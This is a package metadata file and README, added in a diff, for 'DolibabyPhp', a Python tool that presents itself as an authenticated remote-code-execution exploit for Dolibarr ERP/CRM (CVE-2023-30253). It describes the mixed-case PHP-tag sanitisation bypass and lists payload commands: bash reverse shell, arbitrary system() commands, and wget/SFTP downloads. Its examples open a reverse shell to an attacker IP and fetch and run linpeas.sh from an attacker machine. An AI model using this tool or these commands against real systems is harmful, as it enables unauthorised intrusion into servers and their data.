@@ -1,0 +1,104 @@
+Metadata-Version: 2.3
+Name: DolibabyPhp
+Version: 0.1.1
+Summary: Add your description here
+Author-email: Andria Brown <andria_girl@pm.me>
+License: MIT License
+        
+        Copyright (c) 2024 Andria Brown
+        
+        Permission is hereby granted, free of charge, to any person obtaining a copy
+        of this software and associated documentation files (the "Software"), to deal
+        in the Software without restriction, including without limitation the rights
+        to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
+        copies of the Software, and to permit persons to whom the Software is
+        furnished to do so, subject to the following conditions:
+        
+        The above copyright notice and this permission notice shall be included in all
+        copies or substantial portions of the Software.
+        
+        THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+        IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+        FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+        AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+        LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+        OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+        SOFTWARE.
+License-File: LICENSE
+Requires-Python: >=3.12
+Requires-Dist: bs4>=0.0.2
+Requires-Dist: cloup>=3.0.5
+Requires-Dist: furl>=2.1.3
+Requires-Dist: requests>=2.32.3
+Requires-Dist: structlog>=24.2.0
+Requires-Dist: tenacity>=8.5.0
+Requires-Dist: uuid>=1.30
+Description-Content-Type: text/markdown
+
+# DolibabyPhp
+
+An authenticated RCE exploit for Dolibarr ERP/CRM CVE-2023-30253.
+
+## Installation
+
+You can either install the package from the PyPi repository with `pip` or `git clone` the source directly from GitHub.
+
+```shell
+pip install dolibabyphp
+```
+
+## Usage
+
+```txt
+Usage: python -m dolibabyphp [OPTIONS] TARGET_URL USERNAME PASSWORD COMMAND
+                             [ARGS]...
+
+  This exploit will log into the Dolibarr web server at the specified target URL
+  with the provided username and password. After that it will attempt to create
+  a web page with a unique name. Once created, it will modify the web page to
+  include the custom PHP code bypassing the sanitation check by not using only
+  lowercase letters (e.g. PHP or pHp instead of php). There are multiple
+  payloads to choose from After the payload has finished running, the web page
+  will be deleted.
+
+Options:
+  --site-name TEXT       Specify a name to use when creating a site on the
+                         target. Defaults to UUIDv4.
+  --page-name TEXT       Specify a name to use when creating a page on the
+                         target. Defaults to UUIDv4.
+  --page-title TEXT      Specify a title for the page. Defaults to the page
+                         name.
+  --proxy TEXT           Specify a proxy URL for use in all requests.
+  -o, --output FILENAME  Specify a file path to output the results of the
+                         payload to. Defaults to stdout.
+  --help                 Show this message and exit.
+
+Commands:
+  bash-reverse-shell     Spawns a bash shell on the victim machine and...
+  cleanup                Runs the cleanup script on the target for given site...
+  custom-php-payload     Specify your own PHP payload to be run on the victim...
+  custom-system-payload  Specify your own payload to be run via PHP system()...
+  sftp                   SFTPs to the attacker machine, downloads the...
+  wget                   Downloads the file at the specified URL to to the...
+```
+
+### Examples
+
+```shell
+# Reverse shell with Bash
+python -m dolibabyphp http://example.com/ username1 pass_word23 bash-reverse-shell --lhost 1.2.3.4 --lport 4444
+
+# Testing with a proxy
+python -m dolibabyphp --proxy http://127.0.0.1:8080 http://example.com/ username1 pass_word23 custom-system-payload --payload "uname -a"
+
+# SFTP linpeas to the target, execute it, and save the output to a file on the attacker machine.
+python -m dolibabyphp -o ./linpeas-output.txt http://example.com/ username1 pass_word23 sftp --private-key-file ./id_ed25519 sftp://me@1.2.3.4:2222/linpeas.sh ./style.css
+```
+
+## Running from source
+
+In order to run the project from the source code, make sure you add the `src/` directory to the `PYTHONPATH` and then import the module `dolibabyphp` with the `-m` flag.
+
+```shell
+PYTHONPATH="$(pwd)/src/" python -m dolibabyphp
+```
